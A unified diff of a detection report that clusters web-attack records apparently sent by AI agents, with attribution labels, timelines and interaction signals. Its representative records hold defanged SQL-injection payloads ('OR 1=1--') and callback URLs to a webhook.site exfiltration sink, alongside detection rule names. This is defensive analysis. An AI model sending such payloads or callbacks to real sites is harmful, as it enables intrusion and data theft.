@@ -30,7 +30,7 @@ Targets: `gist[.]github[.]com` (3), `account[.]utility-portal[.]example` (2), `b
 
 Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed), tag (Observed, Documented, Inference, Conclusion) and the strongest evidence it rests on. A developer is named only on evidence at least as strong as: identifiers shared with a confirmed incident. Harness and model-family candidates are never named in public.
 
-- **Amazon AWS** (hosting network). 8 record(s) sent from AS16509; 3 record(s) sent from AS16509; 5 record(s) sent from AS16509. Label: Suspected; tag: Observed. A host is not necessarily the developer.
+- **Amazon AWS** (hosting network). 3 record(s) sent from AS16509; 8 record(s) sent from AS16509; 5 record(s) sent from AS16509. Label: Suspected; tag: Observed. A host is not necessarily the developer.
 - **DigitalOcean** (hosting network). 3 record(s) sent from AS14061; 5 record(s) sent from AS14061. Label: Suspected; tag: Observed. A host is not necessarily the developer.
 
 **Harness and framework candidates** (ranked; never named as the source in public):
@@ -48,17 +48,17 @@ Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed)
 A person or a conventional scanner sending the same payloads through the same services leaves the same records. Each cluster is graded by the strongest combination of agent signals it shows, from L0 (payloads only) to L4 (agent likely); only case work reaches L5 (documented). Every signal is a hint that people and tools can also produce, and the grade has no held-out measurement yet.
 
 - **C1**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
-  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 8 record(s) (marker.uq_tags)
-- **C2**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
-  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 8 record(s) (marker.uq_tags)
-- **C3**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
   - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 6 record(s) (marker.uq_tags)
-- **C4**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
+- **C2**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
   - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 5 record(s) (marker.uq_tags)
-- **C5**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
-  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 5 record(s) (marker.uq_tags)
-- **C6**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
+- **C3**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
   - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 3 record(s) (marker.uq_tags)
+- **C4**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
+  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 8 record(s) (marker.uq_tags)
+- **C5**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
+  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 8 record(s) (marker.uq_tags)
+- **C6**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
+  - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 5 record(s) (marker.uq_tags)
 - **C7**: L1 self-described. Attack payloads were present; this alone does not show what sent them.
   - signal (L1): names a model or vendor, or carries an agent test tag (anyone can write this): 3 record(s) (marker.uq_tags)
 
@@ -75,6 +75,12 @@ Every flagged request to each host, including requests outside the linked cluste
 | `support[.]utility-portal[.]example` | 2 | 2026-03-12 16:04:00 UTC | 2026-03-12 16:34:00 UTC | ongoing | `exploit.sqli_boolean` |
 | `b0[.]permits-office[.]example` | 1 | 2026-03-05 14:26:30 UTC | 2026-03-05 14:26:30 UTC | historical | `exploit.sqli_boolean` |
 | `b1[.]permits-office[.]example` | 1 | 2026-03-05 14:27:30 UTC | 2026-03-05 14:27:30 UTC | historical | `exploit.sqli_boolean` |
+| `p0[.]transit-authority[.]example` | 1 | 2026-03-09 09:00:00 UTC | 2026-03-09 09:00:00 UTC | ongoing | none seen |
+| `p1[.]transit-authority[.]example` | 1 | 2026-03-09 09:02:00 UTC | 2026-03-09 09:02:00 UTC | ongoing | none seen |
+| `p2[.]transit-authority[.]example` | 1 | 2026-03-09 09:04:00 UTC | 2026-03-09 09:04:00 UTC | ongoing | none seen |
+| `q0[.]transit-authority[.]example` | 1 | 2026-03-09 09:01:00 UTC | 2026-03-09 09:01:00 UTC | ongoing | none seen |
+| `q1[.]transit-authority[.]example` | 1 | 2026-03-09 09:03:00 UTC | 2026-03-09 09:03:00 UTC | ongoing | none seen |
+| `q2[.]transit-authority[.]example` | 1 | 2026-03-09 09:05:00 UTC | 2026-03-09 09:05:00 UTC | ongoing | none seen |
 | `gist[.]github[.]com` | 3 | 2026-03-05 14:00:00 UTC | 2026-03-05 14:02:00 UTC | historical | none seen |
 | `gist[.]githubusercontent[.]com` | 1 | 2026-03-05 14:25:00 UTC | 2026-03-05 14:25:00 UTC | historical | none seen |
 | `h0[.]county-records[.]example` | 1 | 2026-03-02 10:00:00 UTC | 2026-03-02 10:00:00 UTC | historical | none seen |
@@ -93,76 +99,70 @@ Every flagged request to each host, including requests outside the linked cluste
 | `h7[.]county-records[.]example` | 1 | 2026-03-02 10:05:50 UTC | 2026-03-02 10:05:50 UTC | historical | none seen |
 | `h8[.]county-records[.]example` | 1 | 2026-03-02 10:00:40 UTC | 2026-03-02 10:00:40 UTC | historical | none seen |
 | `h9[.]county-records[.]example` | 1 | 2026-03-02 10:01:30 UTC | 2026-03-02 10:01:30 UTC | historical | none seen |
-| `p0[.]transit-authority[.]example` | 1 | 2026-03-09 09:00:00 UTC | 2026-03-09 09:00:00 UTC | ongoing | none seen |
-| `p1[.]transit-authority[.]example` | 1 | 2026-03-09 09:02:00 UTC | 2026-03-09 09:02:00 UTC | ongoing | none seen |
-| `p2[.]transit-authority[.]example` | 1 | 2026-03-09 09:04:00 UTC | 2026-03-09 09:04:00 UTC | ongoing | none seen |
-| `q0[.]transit-authority[.]example` | 1 | 2026-03-09 09:01:00 UTC | 2026-03-09 09:01:00 UTC | ongoing | none seen |
-| `q1[.]transit-authority[.]example` | 1 | 2026-03-09 09:03:00 UTC | 2026-03-09 09:03:00 UTC | ongoing | none seen |
-| `q2[.]transit-authority[.]example` | 1 | 2026-03-09 09:05:00 UTC | 2026-03-09 09:05:00 UTC | ongoing | none seen |
 
 ## Timeline
 
-- **C1** (significant) — 8 records, 1 run(s), 2026-03-02 10:00:00 UTC → 2026-03-02 10:05:50 UTC, median gap 50s
-  - artifacts: 8 of 8 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
-  - linked by: `param:uqtag=shardA7`
-  - provenance: unknown 8 · single source
-- **C2** (significant) — 8 records, 1 run(s), 2026-03-02 10:00:40 UTC → 2026-03-02 10:06:30 UTC, median gap 50s
-  - artifacts: 8 of 8 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
-  - linked by: `param:uqtag=shardB7`
-  - provenance: unknown 8 · single source
-- **C3** (significant) — 6 records, 1 run(s), 2026-03-09 09:00:00 UTC → 2026-03-09 09:05:00 UTC, median gap 60s
+- **C1** (significant) — 6 records, 1 run(s), 2026-03-09 09:00:00 UTC → 2026-03-09 09:05:00 UTC, median gap 60s
   - artifacts: 6 of 6 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
   - linked by: `exfil.webhook_site:webhook.site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`, `param:uqtag=ag1x`, `param:uqtag=ag2y`
   - provenance: unknown 6 · single source
-- **C4** (significant) — 5 records, 1 run(s), 2026-03-12 16:00:00 UTC → 2026-03-12 16:04:00 UTC, median gap 60s
-  - artifacts: 5 of 5 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
-  - linked by: `param:uqtag=map31z`
-  - provenance: unknown 5 · single source
-- **C5** (significant) — 5 records, 1 run(s), 2026-03-12 16:30:00 UTC → 2026-03-12 16:34:00 UTC, median gap 60s
+- **C2** (significant) — 5 records, 1 run(s), 2026-03-12 16:30:00 UTC → 2026-03-12 16:34:00 UTC, median gap 60s
   - artifacts: 5 of 5 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
   - linked by: `param:uqtag=hit88q`
   - provenance: unknown 5 · single source
   - all 5 records share one URL encoding style (`sp20.sorted.noslash`): consistent with one client, not evidence on its own
   - payload dialect `3e4414d1` over 5 records: sqli (quote_or_1eq1 ×5). Which canonical test payloads a client reaches for is consistent with one model or tool, not evidence on its own
-- **C6** (significant) — 3 records, 1 run(s), 2026-03-05 14:00:00 UTC → 2026-03-05 14:02:00 UTC, median gap 60s
-  - artifacts: 3 of 3 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
-  - linked by: `param:uqtag=scout7f`
-  - provenance: unknown 3 · single source
-- **C7** (significant) — 3 records, 1 run(s), 2026-03-05 14:25:00 UTC → 2026-03-05 14:27:30 UTC, median gap 90s
+- **C3** (significant) — 3 records, 1 run(s), 2026-03-05 14:25:00 UTC → 2026-03-05 14:27:30 UTC, median gap 90s
   - artifacts: 3 of 3 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
   - linked by: `param:uqtag=exec4k`
   - provenance: unknown 3 · single source
   - payload dialect `3e4414d1` over 2 records: sqli (quote_or_1eq1 ×2). Which canonical test payloads a client reaches for is consistent with one model or tool, not evidence on its own
+- **C4** (suggestive) — 8 records, 1 run(s), 2026-03-02 10:00:00 UTC → 2026-03-02 10:05:50 UTC, median gap 50s
+  - artifacts: 8 of 8 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
+  - linked by: `param:uqtag=shardA7`
+  - provenance: unknown 8 · single source
+- **C5** (suggestive) — 8 records, 1 run(s), 2026-03-02 10:00:40 UTC → 2026-03-02 10:06:30 UTC, median gap 50s
+  - artifacts: 8 of 8 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
+  - linked by: `param:uqtag=shardB7`
+  - provenance: unknown 8 · single source
+- **C6** (suggestive) — 5 records, 1 run(s), 2026-03-12 16:00:00 UTC → 2026-03-12 16:04:00 UTC, median gap 60s
+  - artifacts: 5 of 5 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
+  - linked by: `param:uqtag=map31z`
+  - provenance: unknown 5 · single source
+- **C7** (suggestive) — 3 records, 1 run(s), 2026-03-05 14:00:00 UTC → 2026-03-05 14:02:00 UTC, median gap 60s
+  - artifacts: 3 of 3 records carry a trace of how the agent was built (model-output residue, run tags, self-identification, client headers)
+  - linked by: `param:uqtag=scout7f`
+  - provenance: unknown 3 · single source
 
 ## Possible interaction (SC-T9)
 
 Pairs of runs whose records suggest agents acting on each other's output. Each is a weak-to-moderate signal that coincidence, one scheduler or one agent changing route can also produce. None is scored or merges anything; together they are an Inference to review, not a finding. A grouping is called a swarm only once reviewed evidence of interaction is recorded.
 
-- S1 shared sink (moderate): C3#1 (direct · Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/124.0 · AS16509) ↔ C3#1 (relay.jina → target · python-httpx/0.27.0 · AS14061): both write to `webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`; their requests differ in relay route, user agent, network: two agents on one sink, or one agent changing route. Records: eval:swarm-sink-d0, eval:swarm-sink-d1, eval:swarm-sink-d2, eval:swarm-sink-r0, eval:swarm-sink-r1, eval:swarm-sink-r2
-- S2 hand-off (strong): C6#1 → C7#1: `gist/3f9a2c1b7d4e5f60718293a4b5c6d7e8` written by the first and fetched by the second 25 min later; they differ in user agent, network. Records: eval:swarm-handoff-w0, eval:swarm-handoff-f0
-- S4 role sequence (moderate): C4#1 ↔ C5#1: the first only reads 5 hosts; the second attacks 5 of them (Jaccard 1.00), 5 after the first read them; they differ in relay route, user agent, network (p 1.5e-3). Records: eval:swarm-role-x0, eval:swarm-role-x1, eval:swarm-role-x2, eval:swarm-role-y0, eval:swarm-role-y1, eval:swarm-role-y2
-- S5 disjoint partition (weak): C1#1 ↔ C2#1: started 40 s apart, they split `*.county-records[.]example` (8 and 8 hosts, 0 shared; p 1.8e-2). One scheduler sharding a list does the same: a fleet signal unless other edges join these runs. Records: eval:swarm-shard-00, eval:swarm-shard-01, eval:swarm-shard-02, eval:swarm-shard-10, eval:swarm-shard-11, eval:swarm-shard-12
+- S1 shared sink (moderate): C1#1 (direct · Mozilla/5.0 (X11; Linux x86_64) HeadlessChrome/124.0 · AS16509) ↔ C1#1 (relay.jina → target · python-httpx/0.27.0 · AS14061): both write to `webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`; their requests differ in relay route, user agent, network: two agents on one sink, or one agent changing route. Records: eval:swarm-sink-d0, eval:swarm-sink-d1, eval:swarm-sink-d2, eval:swarm-sink-r0, eval:swarm-sink-r1, eval:swarm-sink-r2
+- S2 hand-off (strong): C7#1 → C3#1: `gist/3f9a2c1b7d4e5f60718293a4b5c6d7e8` written by the first and fetched by the second 25 min later; they differ in user agent, network. Records: eval:swarm-handoff-w0, eval:swarm-handoff-f0
+- S4 role sequence (moderate): C6#1 ↔ C2#1: the first only reads 5 hosts; the second attacks 5 of them (Jaccard 1.00), 5 after the first read them; they differ in relay route, user agent, network (p 1.5e-3). Records: eval:swarm-role-x0, eval:swarm-role-x1, eval:swarm-role-x2, eval:swarm-role-y0, eval:swarm-role-y1, eval:swarm-role-y2
+- S5 disjoint partition (weak): C4#1 ↔ C5#1: started 40 s apart, they split `*.county-records[.]example` (8 and 8 hosts, 0 shared; p 1.8e-2). One scheduler sharding a list does the same: a fleet signal unless other edges join these runs. Records: eval:swarm-shard-00, eval:swarm-shard-01, eval:swarm-shard-02, eval:swarm-shard-10, eval:swarm-shard-11, eval:swarm-shard-12
 
 ## Representative records
 
 URLs are defanged. Records are listed by evidence strength.
 
-1. 2026-03-09 09:01:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q0[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
-   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
-1. 2026-03-09 09:03:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q1[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
-   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
-1. 2026-03-09 09:05:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q2[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
-   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
 1. 2026-03-05 14:26:30 UTC — `hxxps://b0[.]permits-office[.]example/item?id=1'%20OR%201=1--&uqtag=exec4k`
    - rules: exploit.sqli_boolean, marker.uq_tags, header.scripted_ua
 1. 2026-03-05 14:27:30 UTC — `hxxps://b1[.]permits-office[.]example/item?id=1'%20OR%201=1--&uqtag=exec4k`
    - rules: exploit.sqli_boolean, marker.uq_tags, header.scripted_ua
 1. 2026-03-09 09:00:00 UTC — `hxxps://p0[.]transit-authority[.]example/api/routes?uqtag=ag1x&cb=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
    - rules: exfil.webhook_site, marker.uq_tags, cache.buster, header.headless_ua
+1. 2026-03-09 09:01:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q0[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
+   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
 1. 2026-03-09 09:02:00 UTC — `hxxps://p1[.]transit-authority[.]example/api/routes?uqtag=ag1x&cb=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
    - rules: exfil.webhook_site, marker.uq_tags, cache.buster, header.headless_ua
+1. 2026-03-09 09:03:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q1[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
+   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
 1. 2026-03-09 09:04:00 UTC — `hxxps://p2[.]transit-authority[.]example/api/routes?uqtag=ag1x&cb=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
    - rules: exfil.webhook_site, marker.uq_tags, cache.buster, header.headless_ua
+1. 2026-03-09 09:05:00 UTC — `hxxps://r[.]jina[.]ai/hxxps://q2[.]transit-authority[.]example/schedule?uqtag=ag2y&hook=hxxps://webhook[.]site/5e8d2c40-3333-4d1e-8f77-6a5b4c3d2e1f`
+   - rules: relay.jina, exfil.webhook_site, marker.uq_tags, header.scripted_ua
 1. 2026-03-12 16:30:00 UTC — `hxxps://billing[.]utility-portal[.]example/account?id=1'%20OR%201=1--&uqtag=hit88q`
    - rules: exploit.sqli_boolean, marker.uq_tags, header.scripted_ua
 1. 2026-03-12 16:31:00 UTC — `hxxps://outage[.]utility-portal[.]example/account?id=1'%20OR%201=1--&uqtag=hit88q`
